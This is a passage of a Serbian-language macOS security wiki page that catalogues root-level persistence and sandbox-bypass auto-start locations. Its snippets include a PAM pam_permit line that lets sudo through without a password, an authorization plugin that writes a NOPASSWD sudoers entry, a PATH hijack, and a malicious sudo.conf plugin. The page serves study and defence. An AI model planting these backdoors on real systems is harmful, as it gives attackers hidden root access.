        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Oba markera su se pojavila. Ponavljanje sa opcijom `-s`, `-I` ili `-S` sprečilo je pojavljivanje oba markera **user-site** u ovom testu. `sitecustomize` u globalnom direktorijumu site nije testiran.

## Root Sandbox Bypass

> [!TIP]
> Ovde možete pronaći lokacije za automatsko pokretanje korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku**, pri čemu vam je potreban **root** i/ili su neophodni neki drugi **neobični uslovi**.

### Periodic

> [!CAUTION]
> **Istorijski mehanizam:** Na testnoj mašini sa macOS 26.5.2 nisu prisutni `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ni launch daemoni `com.apple.periodic-*`. Nemojte pretpostaviti da će kreiranje direktorijuma `/etc/periodic` na aktuelnom sistemu zakazati izvršavanje njegovog sadržaja. Pre korišćenja primera u nastavku proverite da li su na ciljnoj verziji prisutni i komanda i aktivan scheduler.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate imati root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Potreban je root
  - **Okidač**: Kada dođe vreme
- `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
  - Potreban je root
  - **Okidač**: Kada dođe vreme

#### Opis i eksploatacija

Na starijim izdanjima, izvršavanje periodic skripti (**`/etc/periodic`**) zakazivali su **launch daemoni** u `/System/Library/LaunchDaemons/com.apple.periodic*`. Od macOS Big Sur 11.5, periodic runner je izvršavao skripte u periodic direktorijumima kao **vlasnik svake datoteke**, čime je zatvoren raniji put za eskalaciju privilegija.<sup>[[27]](#references)</sup> Komande i spiskovi direktorijuma u nastavku predstavljaju istorijski izlaz, a ne rezultat testa na macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Postoje i druge periodične skripte koje će se izvršavati, navedene u **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Na starijim sistemima na kojima su `periodic` i njegovi launch daemoni instalirani i omogućeni, `/etc/daily.local`, `/etc/weekly.local` i `/etc/monthly.local` predstavljali su dodatne putanje za izvršavanje. Bezopasna provera samo za čitanje je:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Pravilo zasnovano na vlasništvu primenjivalo se na skripte koje se nalaze direktno u periodičnim direktorijumima. Istorijski `999.local` omotač je učitavao `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local` bez iste provere vlasništva; kada se scheduler pokretao kao root, ove lokalne datoteke su se izvršavale kao root. Ova razlika i promena u Big Sur 11.5 dokumentovane su u [originalnom istraživanju](https://theevilbit.github.io/beyond/beyond_0019/). Ne treba pretpostaviti da je neka od ovih putanja aktivna ako `periodic` ne postoji.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Uvek je potreban root

#### Opis i eksploatacija

Pošto je PAM više usmeren na **persistence** i malware nego na jednostavno izvršavanje koda unutar macOS-a, ovaj blog neće detaljno objašnjavati ovu tehniku. **Pročitajte writeup-ove da biste je bolje razumeli**.<sup>[[28]](#references)</sup>

Proverite PAM module pomoću:

```bash
ls -l /etc/pam.d
```

Tehnika persistence/privilege escalation koja zloupotrebljava PAM jednostavna je kao izmena modula /etc/pam.d/sudo uz dodavanje sledeće linije na početak:

```bash
auth       sufficient     pam_permit.so
```

Dakle, **izgledaće** otprilike ovako:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

I zato će svaki pokušaj korišćenja **`sudo` uspeti**.

> [!CAUTION]
> Imajte na umu da je ovaj direktorijum zaštićen pomoću TCC-a, pa je vrlo verovatno da će korisniku biti prikazan upit za dozvolu pristupa.

Još jedan dobar primer je su, gde možete videti da je moguće proslediti parametre PAM modulima (a mogli biste i da postavite backdoor u ovu datoteku):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Dodaci za autorizaciju

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root i dodati još konfiguracija
- TCC bypass: ???

#### Lokacija

- `/Library/Security/SecurityAgentPlugins/`
  - Potreban je root
  - Potrebno je i konfigurisati bazu podataka autorizacije da koristi dodatak

#### Opis i eksploatacija

Možete kreirati dodatak za autorizaciju koji će se izvršavati kada se korisnik prijavi, da biste održali persistence. Za više informacija o kreiranju ovakvih dodataka pogledajte prethodne writeup-e (i budite oprezni; loše napisan dodatak može da vam onemogući pristup, pa ćete morati da očistite Mac iz recovery mode-a).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Premestite** bundle na lokaciju sa koje će biti učitan:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Na kraju dodajte **pravilo** za učitavanje ovog dodatka:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** će obavestiti autorizacioni okvir da treba da **pozove spoljašnji mehanizam za autorizaciju**. Pored toga, **`privileged`** će omogućiti da ga izvrši root.

Pokrenite ga pomoću:

```bash
security authorize com.asdf.asdf
```

I tada bi **staff grupa trebalo da ima sudo** pristup (pročitajte `/etc/sudoers` da biste to potvrdili).

### Man.conf

Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root, a korisnik mora da koristi man
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/private/etc/man.conf`**
  - Potreban je root
  - **`/private/etc/man.conf`**: Kad god se koristi man

#### Opis i Exploit

Konfiguraciona datoteka **`/private/etc/man.conf`** navodi binarnu datoteku/skriptu koja se koristi pri otvaranju man dokumentacije. Zato putanja do izvršne datoteke može da se izmeni tako da se svaki put kada korisnik koristi man za čitanje dokumentacije izvrši backdoor.<sup>[[31]](#references)</sup>

Na primer, podesite sledeće u **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

A zatim kreirajte `/tmp/view` kao:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root, a Apache mora biti pokrenut
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd nema entitlements

#### Lokacija

- **`/etc/apache2/httpd.conf`**
  - Potreban je root
  - Okidač: Kada se Apache2 pokrene

#### Opis i exploit

U `/etc/apache2/httpd.conf` možete navesti da se učita modul dodavanjem linije kao što je:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Na ovaj način će vaš kompajlirani modul učitati Apache. Potrebno je samo da ga **potpišete važećim Apple sertifikatom** ili da **dodate novi pouzdani sertifikat** u sistem i **potpišete ga** tim sertifikatom.

Zatim, ako je potrebno, da biste se uverili da će se server pokrenuti, možete da izvršite:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Primer koda za Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM okvir za audit

Opis: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root, auditd mora biti pokrenut i mora doći do upozorenja
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/etc/security/audit_warn`**
  - Potrebna su root ovlašćenja
  - **Okidač**: Kada auditd detektuje upozorenje

#### Opis i eksploatacija

Kad god auditd detektuje upozorenje, skripta **`/etc/security/audit_warn`** se **izvršava**. Zato možete da dodate svoj payload u nju.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Možete da nametnete upozorenje pomoću `sudo audit -n`.

### Stavke pri pokretanju

> [!CAUTION] > **Ovo je zastarelo, tako da u tim direktorijumima ne bi trebalo ništa da se pronađe.**

**StartupItem** je direktorijum koji treba da se nalazi u direktorijumu `/Library/StartupItems/` ili `/System/Library/StartupItems/`. Kada se ovaj direktorijum napravi, mora da sadrži dve određene datoteke:

1. **rc skriptu**: shell skriptu koja se izvršava pri pokretanju.
2. **plist datoteku**, koja se konkretno zove `StartupParameters.plist` i sadrži različita podešavanja konfiguracije.

Uverite se da su i rc skripta i datoteka `StartupParameters.plist` ispravno smeštene u direktorijum **StartupItem** kako bi ih proces pokretanja prepoznao i koristio.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ne mogu da pronađem ovu komponentu u svom macOS-u, pa za više informacija pogledajte writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple je uveo **emond**, mehanizam za evidentiranje koji deluje nedovršeno ili možda napušteno, ali je i dalje dostupan. Iako nije naročito koristan administratorima Mac računara, ova neupadljiva usluga mogla bi akterima pretnji da posluži kao suptilan metod za održavanje perzistencije, koji će verovatno proći neprimećeno kod većine macOS administratora.<sup>[[34]](#references)</sup>

Onima koji znaju da postoji, lako je da otkriju svaku zlonamernu upotrebu **emond**-a. LaunchDaemon ovog servisa traži skripte za izvršavanje u jednom direktorijumu. Da biste to proverili, možete da upotrebite sledeću komandu:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokacija

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Potreban je root
  - **Okidač**: Uz XQuartz

#### Opis i exploit

XQuartz se **više ne instalira u macOS-u**, pa za više informacija pogledajte writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instaliranje kext-a je toliko komplikovano, čak i kao root, da se ne smatra praktičnom tehnikom za zaobilaženje sandbox-a ili postojanost, osim ako nemate exploit.

#### Lokacija

Da bi se KEXT instalirao kao startup stavka, mora biti **instaliran na jednoj od sledećih lokacija**:

- `/System/Library/Extensions`
  - KEXT datoteke ugrađene u operativni sistem OS X.
- `/Library/Extensions`
  - KEXT datoteke koje instalira softver treće strane

Trenutno učitane kext datoteke možete izlistati pomoću:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Za više informacija o [**ekstenzijama kernela pogledajte ovaj odeljak**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokacija

- **`/usr/local/bin/amstoold`**
  - Potreban je root pristup

#### Opis i eksploatacija

Izgleda da je `plist` datoteka `/System/Library/LaunchAgents/com.apple.amstoold.plist` koristila ovaj binarni fajl, a pritom izlagala XPC service... problem je u tome što binarni fajl nije postojao, pa ste mogli da postavite nešto na tu lokaciju i kada se pozove XPC service, pozvao bi se vaš binarni fajl.<sup>[[35]](#references)</sup>

Više ne mogu da pronađem ovo u svom macOS-u.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokacija

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Potreban je root pristup
  - **Okidač**: Kada se service pokrene (retko)

#### Opis i eksploatacija

Izgleda da se ova skripta ne pokreće često, a nisam mogao ni da je pronađem u svom macOS-u, pa za više informacija pogledajte writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Ovo ne radi u novijim verzijama MacOS-a**

Ovde je moguće postaviti i **komande koje će se izvršiti pri pokretanju sistema.** Primer obične rc.common skripte:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd zadaci pri pokretanju

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (zahteva root)
- Potreban je root, kao i ili **SIP bypass** ili dozvola **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, u zavisnosti od putanje

#### Lokacija

`launchd` ugrađuje plist u svoj odeljak **`__TEXT,__config`**, koji opisuje rane „boot zadatke“. Nekoliko referentnih skripti/binarnih datoteka koje po podrazumevanim podešavanjima **ne postoje** i koje napadač može da kreira:

- SIP-bypass skup: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA skup: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` postoji unapred samo na Sequoia+)

#### Opis i eksploatacija

Ispraznite ugrađenu tabelu zadataka da biste videli koje će datoteke `launchd` pokrenuti i koje ključeve podržava (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Kreiranje jedne od navedenih datoteka (npr. `/etc/rc.server`) dovodi do toga da je `launchd` izvrši pri sledećem (userspace) ponovnom pokretanju. Najkorisniji unosi su zaštićeni SIP-om ili zahtevaju TCC SysAdminFiles/Full Disk Access, tako da je ovo tehnika na nivou root-a koja se aktivira pri ponovnom pokretanju.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Pokretni zadatak `rc.trampoline` pri pokretanju izvršava **platformski (Apple-ovim potpisom potpisan) binarni fajl** sačuvan u NVRAM promenljivoj `apple-trusted-trampoline`, ali **samo kada je postavljen boot-arg `rc.trampoline=1` i SIP je onemogućen** (uz ograničenje veličine od oko 390&nbsp;KB i zahtev da se izvršavanje blokira ili brzo završi). Pošto zahteva **root + onemogućen SIP + payload potpisan Apple-ovim potpisom**, u praksi je gotovo neupotrebljiva za trajno održavanje pristupa i ovde je navedena samo radi potpunosti.<sup>[[41]](#references)</sup>

### /etc/paths i /etc/paths.d (PATH hijack)

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (potreban je root za upis)
- Potreban je root

#### Lokacija

- **`/etc/paths`** i **`/etc/paths.d/*`** — čita ih **`path_helper`** (poziva se iz `/etc/zprofile`) da bi se pri prijavljivanju formirao podrazumevani `PATH`.

#### Opis i eksploatacija

Obe datoteke su u vlasništvu root-a. Dodavanje napadačevog direktorijuma na početak (izmenom `/etc/paths` ili dodavanjem datoteke u `/etc/paths.d/`) postavlja taj direktorijum na početak promenljive `PATH` u svakoj novoj prijavnoj ljusci, pa zlonamerni binarni fajl nazvan kao uobičajena komanda (`ls`, `git`, …) **zasenjuje** pravi i pokreće se sledeći put kada ga žrtva pozove.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Analiza: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (potreban je root)
- Potreban je root; rezultat **zaobilazi SIP**. Pogođeni macOS **15.0–15.1**, ispravljeno u **15.2**

#### Lokacija

- Postavite filesystem bundle u **`/Library/Filesystems/`**.

#### Opis i iskorišćavanje

`storagekitd` poseduje entitlement **`com.apple.rootless.install.heritable`** i pokretao je binarne datoteke filesystem bundle-ova sa tom mogućnošću zaobilaženja SIP-a **nasleđenom**. Postavljanjem zlonamernog filesystem bundle-a, napadač je mogao da pokrene kod uz zaobilaženje SIP-a kako bi instalirao **persistent kernel extensions** ili pisao u direktorijume `LaunchDaemon` zaštićene SIP-om — persistence koja opstaje i zaobilazi uobičajene zaštite.<sup>[[46]](#references)</sup> Apple je ispravio problem u macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Analiza: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (potreban je root za pisanje u `/etc/sudo.conf`)
- Potreban je root za instalaciju; plugin se zatim pokreće pri **svakom pozivu `sudo`** (u setuid-root kontekstu)

#### Lokacija

- **`/etc/sudo.conf`** — linije `Plugin` učitavaju shared objects iz **`/usr/libexec/sudo/`** (ili sa apsolutne putanje). Podrazumevano ne postoji (sudo koristi ugrađenu policy konfiguraciju), pa njegovo kreiranje predstavlja čist hook.

#### Opis i iskorišćavanje

`sudo` učitava svoje policy/approval/audit plugins iz `/etc/sudo.conf`. Pošto je `sudo` setuid-root, zlonamerni shared-object plugin se izvršava sa **root privilegijama svaki put kada bilo koji korisnik pokrene `sudo`** — dugotrajna root persistence koja ujedno vidi svaku sudo komandu.<sup>[[51]](#references)</sup> macOS isporučuje sudo 1.9.x, koji podržava API za plugin-e.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalni primer: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Zastareli mehanizam:** Zastareo od macOS 12.3. macOS 14.1 i novije verzije podrazumevano onemogućavaju zastarele video plug-inove. Korisnik mora da vrati podršku za zastareli video iz Recovery okruženja da bi ovaj put funkcionisao; samo postojanje direktorijuma sa dozvolom za upis nije dovoljno. [Aktuelne smernice Apple-a za podršku](https://support.apple.com/en-us/108387).
- Potreban je root za upis u direktorijum plug-inova. Izvršavanje koda zavisi od kompatibilnog klijenta koji i dalje učitava DAL plug-inove; ovo nije testirano tokom rada na macOS 26.

#### Lokacija

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Potreban je root
  - **Okidač:** Kompatibilni klijent kamere nabraja uređaje **nakon vraćanja podrške za zastarele plug-inove**. Validacija biblioteka klijenta može da blokira plug-in treće strane.

#### Opis i eksploatacija

CoreMediaIO **DAL** (Device Abstraction Layer) plug-inove su neke aplikacije za kameru učitavale u istom procesu. Apple-ova [prezentacija o camera-extension](https://developer.apple.com/videos/play/wwdc2022/10022/) izričito navodi da zastareli DAL plug-inovi **nisu** radili sa FaceTime, QuickTime Player ili Photo Booth, kao i da mnogi drugi klijenti primenjuju validaciju biblioteka. Savremena [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) rade van procesa, uz poseban model instalacije i odobravanja. Istorijska tehnika koja radi unutar procesa ne podrazumeva opšte zaobilaženje Camera TCC-a na aktuelnom macOS-u.<sup>[[53]](#references)[[54]](#references)</sup>

Posmatranje samo za čitanje na macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` postoji i u vlasništvu je root-a. Nije provereno da li je podrška za zastarele plug-inove uključena niti da li ih bilo koji klijent učitava.

### Directory Service Plugins

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Zastareli uslovni mehanizam:** Za instalaciju je potreban root, a plug-in mora biti stvarno podešen i učitan. API za DirectoryService plug-inove je zastareo; pre nego što ovo tretirate kao okidač pri pokretanju, proverite konfiguraciju Open Directory na ciljnom Mac-u.

#### Lokacija

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Potreban je root
  - **Okidač:** `dspluginhelperd` učitava odgovarajući podešeni plug-in kada je potreban Open Directory-ju. [Apple-ov vodič za izvršno okruženje plug-inova](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) navodi da se plug-inovi koji nisu podešeni za pokretanje mogu učitati lenjo kada se otvori njihov čvor.

#### Opis i eksploatacija

`dspluginhelperd` podržava zastarele pakete DirectoryService plug-inova. Zlonamerni plug-in može da omogući izvršavanje sa povišenim privilegijama kada je zastareli plug-in prihvaćen i aktiviran, što se razlikuje od PAM i Authorization Plugins. Samo postojanje direktorijuma ne pokazuje da će se novoupisani plug-in pokrenuti pri sledećem podizanju sistema. Apple-ovi lokalni priručnici `dspluginhelperd(8)` i `opendirectoryd(8)` na macOS 26.5 i dalje navode pomoćni program i ovaj zastareli mehanizam.<sup>[[53]](#references)</sup>

Posmatranje samo za čitanje na macOS 26: `/Library/DirectoryServices/PlugIns` i `/usr/libexec/dspluginhelperd` postoje. Tokom ovog testa nijedan plug-in nije instaliran, podešen niti učitan.

## Tehnike i alati za perzistenciju

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Pored dobrih starih LaunchAgents - 1 - datoteke za pokretanje shell-a](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Pored dobrih starih LaunchAgents - 18 - X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Pored dobrih starih LaunchAgents - 21 - Ponovo otvorene aplikacije](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Pored dobrih starih LaunchAgents - 20 - Podešavanja Terminal-a](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Pored dobrih starih LaunchAgents - 13 - Audio plug-inovi](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit plug-inovi (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Pored dobrih starih LaunchAgents - 12 - QuickLook plug-inovi](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Pored dobrih starih LaunchAgents - 22 - LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Pored dobrih starih LaunchAgents - 4 - cron poslovi](https://theevilbit.github.io/beyond/beyond_0004/)
